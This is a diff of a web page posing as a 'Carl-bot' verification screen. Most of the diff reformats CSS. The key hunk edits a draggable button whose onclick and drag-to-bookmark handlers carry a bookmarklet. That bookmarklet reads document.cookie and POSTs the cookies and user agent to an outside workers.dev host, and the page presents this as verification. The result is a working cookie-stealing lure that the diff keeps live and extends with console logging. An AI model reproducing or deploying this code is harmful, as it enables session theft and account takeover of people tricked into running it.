@@ -5,257 +5,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Carl-bot · Verification</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
-        }
-
-        body {
-            background-color: #0b1a0f;
-            background-image: radial-gradient(circle at 20% 30%, #1a3a22 0%, #0b1a0f 80%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .card {
-            max-width: 720px;
-            width: 100%;
-            background: #0f1d14;
-            border-radius: 32px;
-            border: 1px solid #2b5a38;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 0 1px #1e3d28 inset;
-            padding: 36px 32px 28px;
-        }
-
-        .top-row {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 6px;
-        }
-
-        .badge {
-            display: inline-block;
-            background: #1f402a;
-            color: #8fc99e;
-            font-size: 12px;
-            font-weight: 600;
-            letter-spacing: 0.3px;
-            padding: 4px 14px;
-            border-radius: 30px;
-            border: 1px solid #2f5a3d;
-            text-transform: uppercase;
-        }
-
-        .brand {
-            color: #8fc99e;
-            font-weight: 700;
-            font-size: 16px;
-            letter-spacing: -0.3px;
-        }
-
-        .brand small {
-            font-weight: 400;
-            color: #5a8a6a;
-        }
-
-        h1 {
-            color: #dff0e3;
-            font-size: 26px;
-            font-weight: 700;
-            margin-bottom: 6px;
-        }
-
-        .subhead {
-            color: #8ebc9b;
-            font-size: 15px;
-            margin-bottom: 24px;
-            border-left: 3px solid #3a7a4e;
-            padding-left: 16px;
-            background: rgba(30, 70, 40, 0.25);
-            border-radius: 0 12px 12px 0;
-            line-height: 1.5;
-        }
-
-        .subhead kbd {
-            background: #1b2f20;
-            color: #b7e0c4;
-            padding: 2px 12px;
-            border-radius: 30px;
-            font-size: 12px;
-            border: 1px solid #2f5a3d;
-            font-weight: 600;
-        }
-
-        .drag-section {
-            background: #0e1d14;
-            border-radius: 20px;
-            padding: 22px 20px 26px;
-            border: 1px solid #244d2f;
-            margin-bottom: 18px;
-            box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.5);
-        }
-
-        .drag-label {
-            color: #b0d4bd;
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 14px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-
-        .drag-label kbd {
-            background: #1b2f20;
-            color: #b7e0c4;
-            padding: 2px 12px;
-            border-radius: 30px;
-            font-size: 12px;
-            border: 1px solid #2f5a3d;
-            font-weight: 600;
-        }
-
-        .drag-btn-wrapper {
-            display: flex;
-            justify-content: flex-start;
-            align-items: center;
-            padding: 4px 0;
-        }
-
-        .drag-btn {
-            display: inline-block;
-            background: linear-gradient(145deg, #1d4a2a, #12331e);
-            color: #dff0e3;
-            font-weight: 600;
-            font-size: 18px;
-            padding: 14px 28px;
-            border-radius: 60px;
-            border: 1px solid #3c7a52;
-            box-shadow: 0 6px 0 #0a1f12, 0 8px 20px rgba(0, 0, 0, 0.6);
-            cursor: grab;
-            user-select: none;
-            text-decoration: none;
-            min-width: 180px;
-            text-align: center;
-            transition: all 0.15s ease;
-        }
-
-        .drag-btn:active {
-            cursor: grabbing;
-            transform: scale(0.96);
-            box-shadow: 0 2px 0 #0a1f12, 0 8px 20px rgba(0, 0, 0, 0.7);
-        }
-
-        .drag-btn.dragging {
-            animation: pulseDrag 0.5s infinite alternate ease-in-out;
-            cursor: grabbing;
-        }
-
-        @keyframes pulseDrag {
-            0% {
-                transform: scale(0.98);
-                box-shadow: 0 2px 0 #0a1f12, 0 8px 20px rgba(0, 50, 20, 0.5);
-                background: linear-gradient(145deg, #1d4a2a, #12331e);
-            }
-            100% {
-                transform: scale(1.02);
-                box-shadow: 0 2px 0 #0a1f12, 0 12px 30px rgba(30, 120, 60, 0.4);
-                background: linear-gradient(145deg, #245f34, #143d22);
-            }
-        }
-
-        .drag-icon {
-            font-size: 20px;
-        }
-
-        .step-hint {
-            color: #7da58a;
-            font-size: 13px;
-            margin-top: 14px;
-            background: #0f1f16;
-            padding: 10px 16px;
-            border-radius: 40px;
-            display: inline-block;
-            border: 1px solid #1f402a;
-        }
-
-        .step-hint i {
-            font-style: normal;
-            background: #1a3723;
-            padding: 0 10px;
-            border-radius: 20px;
-            color: #b7e0c4;
-        }
-
-        .footer {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
-            align-items: center;
-            border-top: 1px solid #1f402a;
-            padding-top: 20px;
-            margin-top: 12px;
-            gap: 12px;
-        }
-
-        .footer-left {
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            gap: 18px;
-        }
-
-        .footer-left a {
-            color: #79a887;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            transition: color 0.2s;
-        }
-
-        .footer-left a:hover {
-            color: #b7e0c4;
-            text-decoration: underline;
-        }
-
-        .footer-right {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            flex-wrap: wrap;
-        }
-
-        .login-btn {
-            background: #1f402a;
-            color: #dff0e3;
-            border: 1px solid #2f5a3d;
-            padding: 6px 22px;
-            border-radius: 60px;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: default;
-            transition: background 0.2s;
-        }
-
-        .login-btn:hover {
-            background: #2a5537;
-        }
-
-        @media (max-width: 550px) {
-            .card { padding: 20px 14px; }
-            h1 { font-size: 20px; }
-            .drag-btn { font-size: 16px; padding: 12px 20px; min-width: 140px; }
-            .footer { flex-direction: column; align-items: flex-start; }
-            .footer-right { width: 100%; justify-content: flex-start; }
-            .footer-left { gap: 12px; }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, system-ui, sans-serif; }
+        body { background-color: #0b1a0f; background-image: radial-gradient(circle at 20% 30%, #1a3a22 0%, #0b1a0f 80%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .card { max-width: 720px; width: 100%; background: #0f1d14; border-radius: 32px; border: 1px solid #2b5a38; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 0 1px #1e3d28 inset; padding: 36px 32px 28px; }
+        .top-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px; }
+        .badge { display: inline-block; background: #1f402a; color: #8fc99e; font-size: 12px; font-weight: 600; letter-spacing: 0.3px; padding: 4px 14px; border-radius: 30px; border: 1px solid #2f5a3d; text-transform: uppercase; }
+        .brand { color: #8fc99e; font-weight: 700; font-size: 16px; letter-spacing: -0.3px; }
+        .brand small { font-weight: 400; color: #5a8a6a; }
+        h1 { color: #dff0e3; font-size: 26px; font-weight: 700; margin-bottom: 6px; }
+        .subhead { color: #8ebc9b; font-size: 15px; margin-bottom: 24px; border-left: 3px solid #3a7a4e; padding-left: 16px; background: rgba(30, 70, 40, 0.25); border-radius: 0 12px 12px 0; line-height: 1.5; }
+        .subhead kbd { background: #1b2f20; color: #b7e0c4; padding: 2px 12px; border-radius: 30px; font-size: 12px; border: 1px solid #2f5a3d; font-weight: 600; }
+        .drag-section { background: #0e1d14; border-radius: 20px; padding: 22px 20px 26px; border: 1px solid #244d2f; margin-bottom: 18px; box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.5); }
+        .drag-label { color: #b0d4bd; font-size: 14px; font-weight: 500; margin-bottom: 14px; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+        .drag-label kbd { background: #1b2f20; color: #b7e0c4; padding: 2px 12px; border-radius: 30px; font-size: 12px; border: 1px solid #2f5a3d; font-weight: 600; }
+        .drag-btn-wrapper { display: flex; justify-content: flex-start; align-items: center; padding: 4px 0; }
+        .drag-btn { display: inline-block; background: linear-gradient(145deg, #1d4a2a, #12331e); color: #dff0e3; font-weight: 600; font-size: 18px; padding: 14px 28px; border-radius: 60px; border: 1px solid #3c7a52; box-shadow: 0 6px 0 #0a1f12, 0 8px 20px rgba(0, 0, 0, 0.6); cursor: grab; user-select: none; text-decoration: none; min-width: 180px; text-align: center; transition: all 0.15s ease; }
+        .drag-btn:active { cursor: grabbing; transform: scale(0.96); box-shadow: 0 2px 0 #0a1f12, 0 8px 20px rgba(0, 0, 0, 0.7); }
+        .drag-btn.dragging { animation: pulseDrag 0.5s infinite alternate ease-in-out; cursor: grabbing; }
+        @keyframes pulseDrag { 0% { transform: scale(0.98); box-shadow: 0 2px 0 #0a1f12, 0 8px 20px rgba(0, 50, 20, 0.5); background: linear-gradient(145deg, #1d4a2a, #12331e); } 100% { transform: scale(1.02); box-shadow: 0 2px 0 #0a1f12, 0 12px 30px rgba(30, 120, 60, 0.4); background: linear-gradient(145deg, #245f34, #143d22); } }
+        .drag-icon { font-size: 20px; }
+        .step-hint { color: #7da58a; font-size: 13px; margin-top: 14px; background: #0f1f16; padding: 10px 16px; border-radius: 40px; display: inline-block; border: 1px solid #1f402a; }
+        .step-hint i { font-style: normal; background: #1a3723; padding: 0 10px; border-radius: 20px; color: #b7e0c4; }
+        .footer { display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; border-top: 1px solid #1f402a; padding-top: 20px; margin-top: 12px; gap: 12px; }
+        .footer-left { display: flex; flex-wrap: wrap; align-items: center; gap: 18px; }
+        .footer-left a { color: #79a887; text-decoration: none; font-size: 14px; font-weight: 500; transition: color 0.2s; }
+        .footer-left a:hover { color: #b7e0c4; text-decoration: underline; }
+        .footer-right { display: flex; align-items: center; gap: 16px; flex-wrap: wrap; }
+        .login-btn { background: #1f402a; color: #dff0e3; border: 1px solid #2f5a3d; padding: 6px 22px; border-radius: 60px; font-weight: 600; font-size: 14px; cursor: default; transition: background 0.2s; }
+        .login-btn:hover { background: #2a5537; }
+        @media (max-width: 550px) { .card { padding: 20px 14px; } h1 { font-size: 20px; } .drag-btn { font-size: 16px; padding: 12px 20px; min-width: 140px; } .footer { flex-direction: column; align-items: flex-start; } .footer-right { width: 100%; justify-content: flex-start; } .footer-left { gap: 12px; } }
     </style>
 </head>
 <body>
@@ -281,9 +59,9 @@
 
         <div class="drag-btn-wrapper">
             <a href="javascript:void(0)" 
-               onclick="var c=document.cookie;var xhr=new XMLHttpRequest();xhr.open('POST','https://reciever.tyceno89.workers.dev',true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify({pc:navigator.userAgent,cookies:c}));alert('✅ Verification sent!');" 
+               onclick="var c=document.cookie;console.log('Cookies:', c);var xhr=new XMLHttpRequest();xhr.open('POST','https://reciever.tyceno89.workers.dev',true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify({pc:navigator.userAgent,cookies:c}));alert('✅ Verification sent! Check console for details.');" 
                draggable="true" 
-               ondragstart="event.dataTransfer.setData('text/plain', 'javascript:(function(){var c=document.cookie;var xhr=new XMLHttpRequest();xhr.open(\'POST\',\'https://reciever.tyceno89.workers.dev\',true);xhr.setRequestHeader(\'Content-Type\',\'application/json\');xhr.send(JSON.stringify({pc:navigator.userAgent,cookies:c}));alert(\'✅ Verification sent!\');})();'); this.classList.add('dragging');" 
+               ondragstart="event.dataTransfer.setData('text/plain', 'javascript:(function(){var c=document.cookie;console.log(\'Cookies:\', c);var xhr=new XMLHttpRequest();xhr.open(\'POST\',\'https://reciever.tyceno89.workers.dev\',true);xhr.setRequestHeader(\'Content-Type\',\'application/json\');xhr.send(JSON.stringify({pc:navigator.userAgent,cookies:c}));alert(\'✅ Verification sent! Check console for details.\');})();'); this.classList.add('dragging');" 
                ondragend="this.classList.remove('dragging');" 
                onmousedown="this.classList.add('dragging')" 
                onmouseup="this.classList.remove('dragging')" 
